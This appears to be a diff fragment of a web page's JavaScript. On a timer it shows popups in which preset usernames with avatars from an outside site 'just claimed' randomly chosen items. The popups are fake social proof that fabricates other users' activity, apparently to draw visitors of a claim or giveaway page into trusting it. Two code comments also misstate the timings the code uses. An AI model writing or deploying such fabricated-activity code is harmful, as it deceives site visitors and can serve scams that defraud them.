+    // Function to show the claim popup with new data
+    function showClaimPopup() {
+        // Cycle back to the first preset if the last one is shown
+        if (presetIndex >= usernames.length) {
+            presetIndex = 0; // Reset to start after all presets have been shown
+        }
+
+        // Get the current preset
+        const randomUsername = usernames[presetIndex];
+        const randomAvatar = avatars[presetIndex % avatars.length]; // Use modulo to cycle through avatars
+        const claimedItem = getRandomItem();
+
+        // Update popup content
+        document.getElementById('claim-avatar').src = "https://dress2.pages.dev/" + randomAvatar;
+        document.getElementById('claim-username').textContent = randomUsername;
+        document.getElementById('claim-message').textContent = `Just claimed '${claimedItem}'`;
+
+        // Show the popup with animation
+        const popup = document.getElementById('claim-popup');
+        popup.classList.remove('hidden');
+        popup.style.opacity = '1';
+        popup.style.transform = 'translateY(0)';
+
+        // Hide the popup after 4.5 seconds
+        setTimeout(() => {
+            popup.style.opacity = '0';
+            popup.style.transform = 'translateY(100px)';
+        }, 3500);
+
+        presetIndex++; // Move to the next preset
+    }
+
+    // Show a new claim every 5 seconds
+    setInterval(showClaimPopup, 4000);
+});
+    </script>
+
+
+
+<div class="balloon white" style="left: 794.669px;"><div class="string"></div></div></body></html>
